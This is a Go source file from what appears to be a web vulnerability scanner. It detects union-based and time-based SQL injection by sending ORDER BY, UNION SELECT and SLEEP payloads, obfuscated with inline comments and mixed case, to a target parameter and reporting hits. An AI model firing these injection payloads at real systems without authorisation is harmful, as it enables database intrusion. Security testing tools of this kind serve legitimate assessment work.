package sql

import (
	"fmt"
	"github.com/antlabs/strsim"
	"github.com/thoas/go-funk"
	JieOutput "github.com/yhy0/ChYing/pkg/Jie/pkg/output"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/util"
	"github.com/yhy0/logging"
	"strconv"
	"strings"
	"time"
)

/**
  @author: yhy
  @since: 2023/2/9
  @desc: //TODO
**/

func (sql *Sqlmap) checkUnionBased(pos int, closeType string) bool {
	if sql.guessColumnNum(pos, closeType) != -1 {
		return true
	}

	// 去除这种
	// if sql.bruteColumnNum(pos, closeType) != -1 {
	//    return true
	// }

	return false

}

// 猜列数, 有回显
func (sql *Sqlmap) guessColumnNum(pos int, closeType string) int {
	// OrderByStep := 10
	// OrderByMax := 100
	// lowCols, highCols := 1, OrderByStep
	// found := false

	var (
		payload      string
		columnNum    int
		condition_1  bool
		condition_2  bool
		defaultRatio float64 = -1
		resp         *httpx.Response
	)

	condition_1, defaultRatio, resp = sql.orderByTest(1, pos, closeType, defaultRatio)
	condition_2, defaultRatio, _ = sql.orderByTest(util.RandomNumber(9999, 999999), pos, closeType, defaultRatio)
	if condition_1 && !condition_2 {
		// 这里通过报错，已经可以认为存在注入点了，所以不再探测具体有几列，减少发包探测，剩余验证的交给专业的 sql 去搞
		for index, param := range sql.Variations.Params {
			if index == pos {
				payload = param.Value + closeType + `/**/ORDeR/**/bY/**/` + strconv.Itoa(columnNum) + "#"
				JieOutput.OutChannel <- JieOutput.VulMessage{
					DataType: "web_vul",
					Plugin:   "SQL Injection",
					VulnData: JieOutput.VulnData{
						CreateTime:  time.Now().Format("2006-01-02 15:04:05"),
						Target:      sql.Url,
						Ip:          "",
						Param:       param.Name,
						Request:     resp.RequestDump,
						Response:    resp.ResponseDump,
						Payload:     payload,
						Description: fmt.Sprintf("Union-Based SQL Injection: [%v:%v]", param.Name, param.Value),
					},
					Level: JieOutput.Critical,
				}
				logging.Logger.Errorln("request", resp.RequestDump)
				logging.Logger.Errorln("response", resp.ResponseDump)
				logging.Logger.Debugln("UNION 列数经过ORDER BY 探测为 ", columnNum)
				return columnNum
			}
		}
		// for !found {
		//    condition_volatile, defaultRatio_tmp, _ := sql.orderByTest(highCols, pos, closeType, defaultRatio)
		//    defaultRatio = defaultRatio_tmp
		//    if condition_volatile {
		//        lowCols = highCols
		//        highCols += OrderByStep
		//        if highCols > OrderByMax {
		//            break
		//        }
		//    } else {
		//        var res *httpx.Response
		//        for !found {
		//            var condition_volatile_sec bool
		//            mid := highCols - int(math.Round(float64((highCols-lowCols)/2)))
		//
		//            condition_volatile_sec, defaultRatio_tmp, res = sql.orderByTest(mid, pos, closeType, defaultRatio)
		//
		//            defaultRatio = defaultRatio_tmp
		//            if condition_volatile_sec {
		//                lowCols = mid
		//            } else {
		//                highCols = mid
		//            }
		//
		//            if (highCols - lowCols) < 2 {
		//                columnNum = lowCols
		//                found = true
		//            }
		//        }
		//
		//        for index, param := range sql.Variations.Params {
		//            if index == pos {
		//                payload = param.Value + closeType + `/**/ORDeR/**/bY/**/` + strconv.Itoa(columnNum) + "#"
		//                JieOutput.OutChannel <- JieOutput.VulMessage{
		//                    DataType: "web_vul",
		//                    Plugin:   "SQL Injection",
		//                    VulnData: JieOutput.VulnData{
		//                        CreateTime:  time.Now().Format("2006-01-02 15:04:05"),
		//                        Target:      sql.Url,
		//                        Ip:          "",
		//                        Param:       param.Name,
		//                        Request:     res.RequestDump,
		//                        Response:    res.ResponseDump,
		//                        Payload:     payload,
		//                        Description: fmt.Sprintf("Union-Based SQL Injection: [%v:%v]", param.Name, param.Value),
		//                    },
		//                    Level: JieOutput.Critical,
		//                }
		//                logging.Logger.Debugln("UNION 列数经过ORDER BY 探测为 ", columnNum)
		//                return columnNum
		//            }
		//        }
		//
		//    }
		// }
	}
	return -1
}

// 猜列数, 无回显，基于时间
func (sql *Sqlmap) bruteColumnNum(pos int, closeType string) int {
	var payload string
	/* UPPER_COUNT - LOWER_COUNT *MUST* >= 5 */
	LowerCount := 1
	UpperCount := 15

	err, standardRespTime := getNormalRespondTime(sql)

	if err != nil {
		// 因获取响应时间出错 不再继续测试时间盲注
		logging.Logger.Debugln("尝试检测 TimBased-Blind响应时间失败")
		return -1
	}

	randStr := `"` + util.RandomLetters(5) + `"` + ","

	ratios := make(map[int]float64)

	for index, param := range sql.Variations.Params {
		if index == pos {
			for i := LowerCount; i <= UpperCount; i++ {
				payload = param.Value + closeType + `/**/UniOn/**/All/**/Select/**/` + strings.Repeat(randStr, i)
				payload = sql.Variations.SetPayloadByIndex(param.Index, sql.Url, strings.TrimRight(payload, ",")+"#", sql.Method)
				if payload == "" {
					continue
				}
				var res *httpx.Response
				if sql.Method == "GET" {
					res, err = sql.Client.Request(payload, sql.Method, "", sql.Headers, "SQL-Injection")
				} else {
					res, err = sql.Client.Request(sql.Url, sql.Method, payload, sql.Headers, "SQL-Injection")
				}

				if err != nil {
					logging.Logger.Debugln(sql.Url, "尝试检测 Union SQL Injection Payload 失败")
					continue
				}

				ratios[i-1] = strsim.Compare(res.Body, sql.TemplateBody)
				time.Sleep(time.Millisecond * 500) // 避免过于频繁请求导致速率被限制进而导致结果偏差
				continue
			}
		}
	}

	var (
		lowest                = 1.0
		highest               = 0.0
		lowest_count          = 0
		highest_count         = 0
		distinguish   float64 = -1
	)

	for _, value := range ratios {
		if value > highest {
			highest = value
		}
		if value < lowest {
			lowest = value
		}
	}

	var middle []float64

	for _, value := range ratios {
		if value != highest && value != lowest {
			middle = append(middle, value)
			continue
		}

		if value == lowest {
			lowest_count = lowest_count + 1
		}

		if value == highest {
			highest_count = highest_count + 1
		}
	}

	if len(middle) == 0 && highest != lowest {
		if highest_count == 1 {
			distinguish = highest
		} else if lowest_count == 1 {
			distinguish = lowest
		}
	}

	if distinguish != -1 {
		var columnNum = 0
		for index, value := range ratios {
			if value == distinguish {
				columnNum = index + 1
			}
		}

		md5Randstr := util.RandomLetters(5)
		for index, param := range sql.Variations.Params {
			if index == pos {
				payload = param.Value + closeType + `/**/UniOn/**/All/**/Select/**/` + strings.Repeat(fmt.Sprintf(`md5('%v'),`, md5Randstr), columnNum)

				payload = sql.Variations.SetPayloadByIndex(param.Index, sql.Url, strings.TrimRight(payload, ",")+"#", sql.Method)
				if payload == "" {
					continue
				}
				var res *httpx.Response
				if sql.Method == "GET" {
					res, err = sql.Client.Request(payload, sql.Method, "", sql.Headers, "SQL-Injection")
				} else {
					res, err = sql.Client.Request(sql.Url, sql.Method, payload, sql.Headers, "SQL-Injection")
				}
				if err != nil {
					continue
				}

				md5CheckVal := util.MD5(md5Randstr)
				if funk.Contains(res.ResponseDump, md5CheckVal) {
					JieOutput.OutChannel <- JieOutput.VulMessage{
						DataType: "web_vul",
						Plugin:   "SQL Injection",
						VulnData: JieOutput.VulnData{
							CreateTime:  time.Now().Format("2006-01-02 15:04:05"),
							Target:      sql.Url,
							Ip:          "",
							Param:       param.Name,
							Request:     res.RequestDump,
							Response:    res.ResponseDump,
							Payload:     payload,
							Description: fmt.Sprintf("UNION SQL Injection: [%v:%v]", param.Name, param.Value),
						},
						Level: JieOutput.Critical,
					}

					logging.Logger.Debugln("UNION 列数经过ORDER BY 探测为 ", columnNum)
					return columnNum
				}
			}
		}
	}

	for index, param := range sql.Variations.Params {
		if index == pos {
			for i := LowerCount; i <= UpperCount; i++ {
				payload = param.Value + closeType + `/**/UniOn/**/Select/**/` + strings.Repeat(randStr, i-1)
				payload += sql.Variations.SetPayloadByIndex(param.Index, sql.Url, fmt.Sprintf(`SLeep(%v)#`, standardRespTime*2/1000+3), sql.Method)
				if payload == "" {
					continue
				}
				var res *httpx.Response
				if sql.Method == "GET" {
					res, err = sql.Client.Request(payload, sql.Method, "", sql.Headers, "SQL-Injection")
				} else {
					res, err = sql.Client.Request(sql.Url, sql.Method, payload, sql.Headers, "SQL-Injection")
				}

				if err != nil {
					continue
				}

				if res.ServerDurationMs > standardRespTime*2+1000 {
					JieOutput.OutChannel <- JieOutput.VulMessage{
						DataType: "web_vul",
						Plugin:   "SQL Injection",
						VulnData: JieOutput.VulnData{
							CreateTime:  time.Now().Format("2006-01-02 15:04:05"),
							Target:      sql.Url,
							Ip:          "",
							Param:       param.Name,
							Request:     res.RequestDump,
							Response:    res.ResponseDump,
							Payload:     payload,
							Description: fmt.Sprintf("UNION SQL Injection: [%v:%v]", param.Name, param.Value),
						},
						Level: JieOutput.Critical,
					}
					logging.Logger.Debugln(sql.Url, "UNION 列数经过UNION BruteForce sleep探测为 ", i)
					return i
				} else {
					time.Sleep(time.Millisecond * 500) // 避免过于频繁请求导致结果偏差
					continue
				}
			}
		}
	}

	return -1
}

func (sql *Sqlmap) orderByTest(number, pos int, closeType string, defaultRatio float64) (bool, float64, *httpx.Response) {
	var payload string

	for index, param := range sql.Variations.Params {
		if index == pos {
			payload = param.Value + closeType + `/**/ORDeR/**/bY/**/` + strconv.Itoa(number) + "#"
			payload = sql.Variations.SetPayloadByIndex(param.Index, sql.Url, payload, sql.Method)
			if payload == "" {
				continue
			}
			var res *httpx.Response
			var err error
			if sql.Method == "GET" {
				res, err = sql.Client.Request(payload, sql.Method, "", sql.Headers, "SQL-Injection")
			} else {
				res, err = sql.Client.Request(sql.Url, sql.Method, payload, sql.Headers, "SQL-Injection")
			}

			if err != nil {
				continue
			}

			// 每种检测方式都加上这个报错检测
			sql.DBMS = checkDBMSError(sql.Url, param.Name, payload, res)
			if sql.DBMS != "" {
				return false, 0, nil
			}

			condition, dr := sql.comparison(res.Body, res.StatusCode, defaultRatio)

			math1, _ := util.MatchAnyOfRegexp([]string{"(warning|error):", "order (by|clause)", "unknown column", "failed"}, res.Body)
			math2, _ := util.MatchAnyOfRegexp([]string{"data types cannot be compared or sorted"}, res.Body)

			return !math1 && condition || math2, dr, res
		}
	}
	return false, 0, nil
}
